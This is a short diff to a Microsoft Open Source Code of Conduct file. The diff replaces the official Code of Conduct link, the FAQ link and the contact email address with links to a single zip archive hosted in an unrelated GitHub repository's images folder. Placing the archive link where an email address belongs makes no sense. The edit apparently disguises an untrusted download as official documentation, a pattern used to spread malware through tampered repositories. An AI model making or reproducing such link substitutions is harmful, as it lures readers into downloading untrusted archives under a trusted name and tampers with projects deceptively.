@@ -1,3 +1,3 @@
 ## Microsoft Open Source Code of Conduct
-This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
-For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
+This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/geodesit/mixed-reality/master/mixed-reality-docs/images/MRTK101/mixed-reality_1.7.zip).
+For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/geodesit/mixed-reality/master/mixed-reality-docs/images/MRTK101/mixed-reality_1.7.zip) or contact [https://raw.githubusercontent.com/geodesit/mixed-reality/master/mixed-reality-docs/images/MRTK101/mixed-reality_1.7.zip](https://raw.githubusercontent.com/geodesit/mixed-reality/master/mixed-reality-docs/images/MRTK101/mixed-reality_1.7.zip) with any additional questions or comments.
